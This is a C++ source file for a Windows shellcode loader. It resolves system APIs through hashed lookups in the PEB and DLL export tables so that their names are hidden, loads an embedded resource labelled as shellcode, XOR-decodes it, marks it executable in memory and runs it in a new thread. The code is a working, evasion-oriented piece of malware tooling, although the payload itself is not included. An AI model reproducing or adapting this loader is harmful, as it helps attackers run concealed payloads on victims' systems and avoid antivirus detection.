#include "monolith.hpp"
#include "definitions.hpp"
#include "multitool.hpp"

#include <stdio.h>
#include <cstdint>

#define SHELLCODE       101
#define FVN_OFFSET		(const unsigned int) 2166136261
#define FVN_PRIME		(const unsigned int) 16777619
#define LOCAL_HEAP		((PPEB)__readgsqword(0x60))->ProcessHeap

#define DEBUG
#ifdef DEBUG
#define INFO 			setbuf(stdout, 0); printf("[INFO] ")
#define ERR 			setbuf(stdout, 0); printf("[ERROR] ")
#define DBG_PRINT(m,x) 	m; setbuf(stdout, 0); printf x
#else
#define INFO 
#define ERR
#define DBG_PRINT(m,x) 	do {} while (0)
#endif

HMODULE GetModuleAddress(DWORD hash);
FARPROC GetSymbolAddress(HMODULE base, DWORD hash);

PAPI ResolveApi() {

	auto RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
	auto instance 			= (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));

	DBG_PRINT(INFO, ("API* instance: %lx\n", instance));

	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATEREMOTETHREAD);
	instance->win32.NtWaitForSingleObject = (NtWaitForSingleObject_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
	instance->win32.FindResourceA = (FindResourceA_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
	instance->win32.RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
	instance->win32.RtlFreeHeap = (RtlFreeHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);

	return instance;
}

template<typename MTYPE> DWORD HashString(MTYPE string, SIZE_T length) {
	
	auto hash = FVN_OFFSET;

	for (auto i = 0; i < length; i++) {
		hash ^= string[i];
		hash *= FVN_PRIME;
	}
	return hash;
}

HMODULE GetModuleAddress(DWORD hash) {

	auto head = (PLIST_ENTRY)(&((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList);
	auto next = head->Flink;

	while (next != head) {

		auto mod = (PLDR_MODULE)((PBYTE)next - sizeof(DWORD) * 4);
		auto name = mod->BaseDllName.Buffer;

		if (name) {
			if (hash - HashString(name, wcslen(name)) == 0) {
				return (HMODULE)mod->BaseAddress;
			}
		}
		next = next->Flink;
	}
	DBG_PRINT(ERR, ("module (0x%lx) not found\n", hash));
	return nullptr;
}

FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {

	if (!base) {
		return nullptr;
	}
	auto doshead	= (PIMAGE_DOS_HEADER)base;
	auto nthead	= (PIMAGE_NT_HEADERS)((PBYTE)base + doshead->e_lfanew);
	auto exports	= (PIMAGE_EXPORT_DIRECTORY)((PBYTE)doshead + (nthead)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	if (exports->AddressOfNames) {

		auto ordinals	= RVA(PWORD, base, exports->AddressOfNameOrdinals);
		auto functions	= RVA(PDWORD, base, exports->AddressOfFunctions);
		auto names	= RVA(PDWORD, base, exports->AddressOfNames);

		for (auto i = 0; i < exports->NumberOfNames; i++) {
			auto name = RVA(LPSTR, base, names[i]);

			if (hash - HashString(name, strlen(name)) == 0) {
				DBG_PRINT(INFO, ("function %s found\n", name));
				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
			}
		}
		DBG_PRINT(ERR, ("function (0x%lx) was not found\n", hash));
		return nullptr;
	}
}

int main() {

	PAPI instance 		= { 0 };
	HANDLE hThread 		= { 0 };
	DWORD protect 		= { 0 };
	LPVOID lpBuffer 	= { 0 };
	NTSTATUS ntstatus 	= { 0 };
	PRESOURCE resource 	= { 0 };

	DBG_PRINT(INFO, ("resolving api\n"));

	instance = ResolveApi();
	resource = (PRESOURCE)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(PRESOURCE));

	DBG_PRINT(INFO, ("allocating resource\n"));

	resource			= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
	if (!resource) {
		DBG_PRINT(ERR, ("failed to allocate space for resource: %lx\n", GetLastError()));
		return 1;
	}
	resource->Id		= MAKEINTRESOURCEA(SHELLCODE);
	if (!resource->Id) {
		DBG_PRINT(ERR, ("failed to get resource Id: %lx\n", GetLastError()));
		return 1;
	}
	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA);
	if (!resource->Object) {
		DBG_PRINT(ERR, ("failed to get pointer to resource object: %lx\n", GetLastError()));
		return 1;
	}
	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
	if (!resource->Length) {
		DBG_PRINT(ERR, ("failed to get size of resource: %lx\n", GetLastError()));
		return 1;
	}
	resource->hGlobal 	= instance->win32.LoadResource(NULL, resource->Object);
	if (!resource->hGlobal) {
		DBG_PRINT(ERR, ("failed to get data from resource: %lx\n", GetLastError()));
		return 1;
	}

	DBG_PRINT(INFO, ("resource loaded, allocating %llu bytes virtual memory\n", resource->Length));

	ntstatus = instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NT_SUCCESS(ntstatus)) {

		DBG_PRINT(INFO, ("copying resources to buffer\n"));
		x_memcpy(lpBuffer, resource->hGlobal, resource->Length);

		DBG_PRINT(INFO, ("decipher\n"));
		for (auto i = 0; i < resource->Length; i++) {
			((PBYTE)lpBuffer)[i] ^= 0x0A;
		}

		DBG_PRINT(INFO, ("changing page protections\n"));
		ntstatus = instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect);
		if (NT_SUCCESS(ntstatus)) {

			DBG_PRINT(INFO, ("creating thread\n"));
			hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
			instance->win32.NtWaitForSingleObject(hThread, FALSE, INFINITE);
		} 	
	}
	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, resource);
	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, instance);

	DBG_PRINT(INFO, ("exit code: 0x%lx\n", ntstatus));
	return 0;
}

